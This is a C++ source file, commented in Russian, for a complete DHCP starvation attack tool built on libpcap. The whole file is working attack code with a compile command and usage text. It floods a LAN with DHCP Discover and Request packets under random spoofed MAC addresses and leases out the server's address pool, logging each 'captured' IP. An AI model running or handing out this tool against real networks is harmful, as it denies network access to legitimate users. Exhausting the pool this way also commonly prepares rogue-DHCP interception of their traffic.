// g++ -O2 -pthread DHCPstarvation.cpp -o dhcp_starvation -lpcap -std=c++11
#include <pcap.h>
#include <netinet/if_ether.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <signal.h>
#include <atomic>
#include <thread>
#include <chrono>
#include <map>
#include <string>
#include <cstring>
#include <cstdio>
#include <cstdlib>
#include <ctime>
#include <random>
#include <vector>

// ========== Свои структуры (префикс my_) ==========
#pragma pack(push, 1)
struct my_ether_header {
    uint8_t  dst_mac[6];
    uint8_t  src_mac[6];
    uint16_t ether_type;
};

struct my_ip_header {
    uint8_t  ihl:4, version:4;
    uint8_t  tos;
    uint16_t tot_len;
    uint16_t id;
    uint16_t frag_off;
    uint8_t  ttl;
    uint8_t  protocol;
    uint16_t check;
    uint32_t saddr;
    uint32_t daddr;
};

struct my_udp_header {
    uint16_t source;
    uint16_t dest;
    uint16_t len;
    uint16_t check;
};

struct my_bootp_header {
    uint8_t  opcode;
    uint8_t  htype;
    uint8_t  hlen;
    uint8_t  hops;
    uint32_t xid;
    uint16_t secs;
    uint16_t flags;
    uint32_t ciaddr;
    uint32_t yiaddr;
    uint32_t siaddr;
    uint32_t giaddr;
    uint8_t  chaddr[16];
    uint8_t  sname[64];
    uint8_t  file[128];
    uint32_t magic;
};
#pragma pack(pop)

std::atomic<bool> stop_flag(false);
bool use_real_mac = false;  // по умолчанию случайные MAC

void signal_handler(int) { stop_flag = true; }

// ========== Вспомогательные функции ==========
bool get_if_mac(const char* ifname, uint8_t* mac) {
    struct ifreq ifr;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return false;
    strcpy(ifr.ifr_name, ifname);
    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) { close(sock); return false; }
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
    close(sock);
    return true;
}

uint16_t ip_checksum(uint16_t *ptr, int len) {
    uint32_t sum = 0;
    while (len > 1) { sum += *ptr++; len -= 2; }
    if (len) sum += *(uint8_t*)ptr;
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    return ~sum;
}

void random_mac(uint8_t* mac) {
    static std::random_device rd;
    static std::mt19937 gen(rd());
    static std::uniform_int_distribution<> dis(0, 255);
    // Реалистичные префиксы
    uint8_t prefixes[] = {0x00, 0x9c, 0x8c, 0x2c, 0x4c, 0x6c, 0xa4, 0xb8, 0xd0};
    mac[0] = prefixes[dis(gen) % (sizeof(prefixes)/sizeof(prefixes[0]))];
    for (int i = 1; i < 6; ++i) mac[i] = dis(gen);
}

void random_xid(uint32_t* xid) {
    static std::random_device rd;
    static std::mt19937 gen(rd());
    static std::uniform_int_distribution<uint32_t> dis(0, 0xFFFFFFFF);
    *xid = dis(gen);
}

// ========== Отправка DHCP Discover ==========
void send_dhcp_discover(pcap_t* handle, const uint8_t* client_mac, const uint8_t* real_src_mac,
                        uint32_t xid, const char* iface) {
    uint8_t packet[1024];
    memset(packet, 0, sizeof(packet));

    struct my_ether_header* eth = (struct my_ether_header*)packet;
    memset(eth->dst_mac, 0xFF, 6);
    memcpy(eth->src_mac, real_src_mac, 6);
    eth->ether_type = htons(ETHERTYPE_IP);

    struct my_ip_header* ip = (struct my_ip_header*)(packet + sizeof(struct my_ether_header));
    ip->version = 4; ip->ihl = 5; ip->tos = 0;
    ip->tot_len = htons(sizeof(struct my_ip_header) + sizeof(struct my_udp_header) + sizeof(struct my_bootp_header) + 64);
    ip->id = 0; ip->frag_off = 0; ip->ttl = 64; ip->protocol = IPPROTO_UDP; ip->check = 0;
    ip->saddr = 0; ip->daddr = htonl(0xFFFFFFFF);
    ip->check = ip_checksum((uint16_t*)ip, sizeof(struct my_ip_header));

    struct my_udp_header* udp = (struct my_udp_header*)((uint8_t*)ip + sizeof(struct my_ip_header));
    udp->source = htons(68); udp->dest = htons(67);
    udp->len = htons(sizeof(struct my_udp_header) + sizeof(struct my_bootp_header) + 64);
    udp->check = 0;

    struct my_bootp_header* bootp = (struct my_bootp_header*)((uint8_t*)udp + sizeof(struct my_udp_header));
    bootp->opcode = 1; bootp->htype = 1; bootp->hlen = 6; bootp->hops = 0;
    bootp->xid = htonl(xid); bootp->secs = 0; bootp->flags = 0;
    bootp->ciaddr = 0; bootp->yiaddr = 0; bootp->siaddr = 0; bootp->giaddr = 0;
    memcpy(bootp->chaddr, client_mac, 6);
    bootp->magic = htonl(0x63825363);

    uint8_t* opt = (uint8_t*)bootp + sizeof(struct my_bootp_header);
    *opt++ = 53; *opt++ = 1; *opt++ = 1; // Discover
    *opt++ = 55; *opt++ = 4; *opt++ = 1; *opt++ = 3; *opt++ = 6; *opt++ = 15;
    *opt++ = 12; *opt++ = 5; memcpy(opt, "test", 5); opt += 5;
    *opt++ = 60; *opt++ = 8; memcpy(opt, "MSFT 5.0", 8); opt += 8; // Vendor Class
    *opt++ = 255;

    size_t total_len = (uint8_t*)opt - packet;
    if (pcap_sendpacket(handle, packet, total_len) != 0) {
        fprintf(stderr, "pcap_sendpacket error: %s\n", pcap_geterr(handle));
    } else {
        fprintf(stderr, "Sent Discover (len=%zu) for MAC ", total_len);
        for(int i=0;i<6;i++) fprintf(stderr, "%02x%s", client_mac[i], i<5?":":"");
        fprintf(stderr, "\n");
        fflush(stderr);
    }
}

// ========== Отправка DHCP Request ==========
void send_dhcp_request(pcap_t* handle, const uint8_t* client_mac, const uint8_t* real_src_mac,
                       uint32_t xid, uint32_t offered_ip, uint32_t server_ip) {
    uint8_t packet[1024];
    memset(packet, 0, sizeof(packet));

    struct my_ether_header* eth = (struct my_ether_header*)packet;
    memset(eth->dst_mac, 0xFF, 6);
    memcpy(eth->src_mac, real_src_mac, 6);
    eth->ether_type = htons(ETHERTYPE_IP);

    struct my_ip_header* ip = (struct my_ip_header*)(packet + sizeof(struct my_ether_header));
    ip->version = 4; ip->ihl = 5; ip->tos = 0;
    ip->tot_len = htons(sizeof(struct my_ip_header) + sizeof(struct my_udp_header) + sizeof(struct my_bootp_header) + 64);
    ip->id = 0; ip->frag_off = 0; ip->ttl = 64; ip->protocol = IPPROTO_UDP; ip->check = 0;
    ip->saddr = 0; ip->daddr = htonl(0xFFFFFFFF);
    ip->check = ip_checksum((uint16_t*)ip, sizeof(struct my_ip_header));

    struct my_udp_header* udp = (struct my_udp_header*)((uint8_t*)ip + sizeof(struct my_ip_header));
    udp->source = htons(68); udp->dest = htons(67);
    udp->len = htons(sizeof(struct my_udp_header) + sizeof(struct my_bootp_header) + 64);
    udp->check = 0;

    struct my_bootp_header* bootp = (struct my_bootp_header*)((uint8_t*)udp + sizeof(struct my_udp_header));
    bootp->opcode = 1; bootp->htype = 1; bootp->hlen = 6; bootp->hops = 0;
    bootp->xid = htonl(xid); bootp->secs = 0; bootp->flags = 0;
    bootp->ciaddr = 0; bootp->yiaddr = 0; bootp->siaddr = 0; bootp->giaddr = 0;
    memcpy(bootp->chaddr, client_mac, 6);
    bootp->magic = htonl(0x63825363);

    uint8_t* opt = (uint8_t*)bootp + sizeof(struct my_bootp_header);
    *opt++ = 53; *opt++ = 1; *opt++ = 3; // Request
    *opt++ = 50; *opt++ = 4; *(uint32_t*)opt = offered_ip; opt += 4;
    *opt++ = 54; *opt++ = 4; *(uint32_t*)opt = server_ip; opt += 4;
    *opt++ = 255;

    size_t total_len = (uint8_t*)opt - packet;
    if (pcap_sendpacket(handle, packet, total_len) != 0) {
        fprintf(stderr, "pcap_sendpacket error: %s\n", pcap_geterr(handle));
    } else {
        fprintf(stderr, "Sent Request\n");
        fflush(stderr);
    }
}

// ========== Сниффер для Offer/ACK ==========
struct DhcpContext {
    uint32_t xid;
    uint32_t offered_ip;
    uint32_t ack_ip;
    uint32_t server_ip;
    bool offer_received;
    bool ack_received;
    std::chrono::steady_clock::time_point start_time;
};

void dhcp_sniff_handler(u_char* user, const struct pcap_pkthdr* pkthdr, const u_char* packet) {
    DhcpContext* ctx = (DhcpContext*)user;
    if (ctx->ack_received) return;

    struct my_ether_header* eth = (struct my_ether_header*)packet;
    if (ntohs(eth->ether_type) != ETHERTYPE_IP) return;

    struct ip* ip = (struct ip*)(packet + sizeof(struct my_ether_header));
    if (ip->ip_p != IPPROTO_UDP) return;

    struct udphdr* udp = (struct udphdr*)((uint8_t*)ip + (ip->ip_hl << 2));
    if (ntohs(udp->uh_sport) != 67 || ntohs(udp->uh_dport) != 68) return;

    struct my_bootp_header* bootp = (struct my_bootp_header*)((uint8_t*)udp + sizeof(struct udphdr));
    if (bootp->xid != htonl(ctx->xid)) return;

    uint8_t* opt = (uint8_t*)bootp + sizeof(struct my_bootp_header);
    uint8_t msg_type = 0;
    while (*opt != 255) {
        if (*opt == 53) { msg_type = *(opt+2); break; }
        opt += *(opt+1) + 2;
    }

    if (msg_type == 2) { // DHCPOFFER
        ctx->offered_ip = bootp->yiaddr;
        ctx->offer_received = true;
        opt = (uint8_t*)bootp + sizeof(struct my_bootp_header);
        while (*opt != 255) {
            if (*opt == 54) {
                ctx->server_ip = *(uint32_t*)(opt+2);
                break;
            }
            opt += *(opt+1) + 2;
        }
        fprintf(stderr, "Received OFFER, IP: %s\n", inet_ntoa(*(struct in_addr*)&ctx->offered_ip));
        fflush(stderr);
    } else if (msg_type == 5) { // DHCPACK
        ctx->ack_ip = bootp->yiaddr;
        ctx->ack_received = true;
        fprintf(stderr, "Received ACK, IP: %s\n", inet_ntoa(*(struct in_addr*)&ctx->ack_ip));
        fflush(stderr);
    }
}

// ========== Основная функция атаки ==========
void dhcp_attack(const char* iface, int pool_size, int count, double delay,
                 int offer_timeout, int ack_timeout) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(iface, 65536, 1, 1000, errbuf);
    if (!handle) {
        fprintf(stderr, "pcap_open_live: %s\n", errbuf);
        return;
    }
    if (pcap_datalink(handle) != DLT_EN10MB) {
        fprintf(stderr, "Interface not Ethernet\n");
        pcap_close(handle);
        return;
    }

    uint8_t real_mac[6];
    if (!get_if_mac(iface, real_mac)) {
        fprintf(stderr, "Cannot get MAC\n");
        pcap_close(handle);
        return;
    }

    std::map<std::string, uint32_t> captured_ips;
    int sent_packets = 0;
    int unique_macs = 0;
    auto start_time = std::chrono::steady_clock::now();

    printf("DHCP Starvation started on %s\n", iface);
    printf("Pool size: %d, Count: %d, Delay: %.2f, Offer timeout: %d, ACK timeout: %d\n",
           pool_size, count, delay, offer_timeout, ack_timeout);
    printf("Using random MAC: %s\n", use_real_mac ? "no (real MAC)" : "yes");

    for (int i = 0; i < count && !stop_flag; ++i) {
        uint8_t client_mac[6];
        if (use_real_mac) {
            memcpy(client_mac, real_mac, 6);
        } else {
            random_mac(client_mac);
        }
        char mac_str[18];
        sprintf(mac_str, "%02x:%02x:%02x:%02x:%02x:%02x",
                client_mac[0], client_mac[1], client_mac[2],
                client_mac[3], client_mac[4], client_mac[5]);

        uint32_t xid;
        random_xid(&xid);

        send_dhcp_discover(handle, client_mac, real_mac, xid, iface);
        sent_packets++;
        unique_macs++;

        DhcpContext ctx;
        ctx.xid = xid;
        ctx.offer_received = false;
        ctx.ack_received = false;
        ctx.offered_ip = 0;
        ctx.ack_ip = 0;
        ctx.server_ip = 0;
        ctx.start_time = std::chrono::steady_clock::now();

        while (!stop_flag && !ctx.offer_received &&
               std::chrono::duration_cast<std::chrono::seconds>(
                   std::chrono::steady_clock::now() - ctx.start_time).count() < offer_timeout) {
            pcap_dispatch(handle, 1, dhcp_sniff_handler, (u_char*)&ctx);
            std::this_thread::sleep_for(std::chrono::milliseconds(10));
        }

        if (ctx.offer_received) {
            send_dhcp_request(handle, client_mac, real_mac, xid, ctx.offered_ip, ctx.server_ip);
            sent_packets++;

            auto ack_start = std::chrono::steady_clock::now();
            while (!stop_flag && !ctx.ack_received &&
                   std::chrono::duration_cast<std::chrono::seconds>(
                       std::chrono::steady_clock::now() - ack_start).count() < ack_timeout) {
                pcap_dispatch(handle, 1, dhcp_sniff_handler, (u_char*)&ctx);
                std::this_thread::sleep_for(std::chrono::milliseconds(10));
            }

            if (ctx.ack_received) {
                char ip_str[INET_ADDRSTRLEN];
                inet_ntop(AF_INET, &ctx.ack_ip, ip_str, INET_ADDRSTRLEN);
                captured_ips[mac_str] = ctx.ack_ip;
                printf("[CAPTURED] %s -> %s\n", mac_str, ip_str);
                fflush(stdout);
            }
        }

        if ((i+1) % 100 == 0) {
            auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(
                std::chrono::steady_clock::now() - start_time).count();
            printf("[STATS] Sent: %d, Unique MACs: %d, Captured IPs: %zu, Time: %lds\n",
                   sent_packets, unique_macs, captured_ips.size(), elapsed);
            fflush(stdout);
        }

        if (delay > 0)
            std::this_thread::sleep_for(std::chrono::milliseconds((int)(delay * 1000)));

        if (unique_macs >= pool_size)
            unique_macs = 0;
    }

    pcap_close(handle);

    auto total_time = std::chrono::duration_cast<std::chrono::milliseconds>(
        std::chrono::steady_clock::now() - start_time).count();
    printf("\n--- FINAL STATS ---\n");
    printf("Total packets sent: %d\n", sent_packets);
    printf("Unique MACs generated: %zu\n", captured_ips.size() + (sent_packets - captured_ips.size()));
    printf("Captured IP addresses: %zu\n", captured_ips.size());
    printf("Duration: %ld ms\n", total_time);
    if (total_time > 0)
        printf("Avg rate: %.2f pps\n", (sent_packets * 1000.0) / total_time);
    if (!captured_ips.empty()) {
        printf("Captured IPs:\n");
        for (auto& pair : captured_ips) {
            char ip_str[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &pair.second, ip_str, INET_ADDRSTRLEN);
            printf("  %s -> %s\n", pair.first.c_str(), ip_str);
        }
    }
}

// ========== main с поддержкой обоих форматов ==========
int main(int argc, char* argv[]) {
    if (argc < 4) {
        fprintf(stderr, "Usage: %s <interface> <count> <delay> [pool_size] [offer_timeout] [ack_timeout] [--real-mac]\n", argv[0]);
        return 1;
    }

    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);

    const char* iface = argv[1];
    int pool_size = 254;
    int count = 0;
    double delay = 0;
    int offer_timeout = 30;
    int ack_timeout = 5;

    // Парсинг (поддерживает оба формата: <iface> <count> <delay> или <iface> <pool_size> <count> <delay> <offer> <ack>)
    if (argc == 4) {
        // старый формат: <iface> <count> <delay>
        count = atoi(argv[2]);
        delay = atof(argv[3]);
    } else if (argc >= 7) {
        // новый формат: <iface> <pool_size> <count> <delay> <offer> <ack>
        pool_size = atoi(argv[2]);
        count = atoi(argv[3]);
        delay = atof(argv[4]);
        offer_timeout = atoi(argv[5]);
        ack_timeout = atoi(argv[6]);
    } else {
        fprintf(stderr, "Invalid number of arguments.\n");
        return 1;
    }

    // Проверка флага --real-mac
    for (int i=1; i<argc; ++i) {
        if (strcmp(argv[i], "--real-mac") == 0) use_real_mac = true;
    }

    dhcp_attack(iface, pool_size, count, delay, offer_timeout, ack_timeout);
    return 0;
}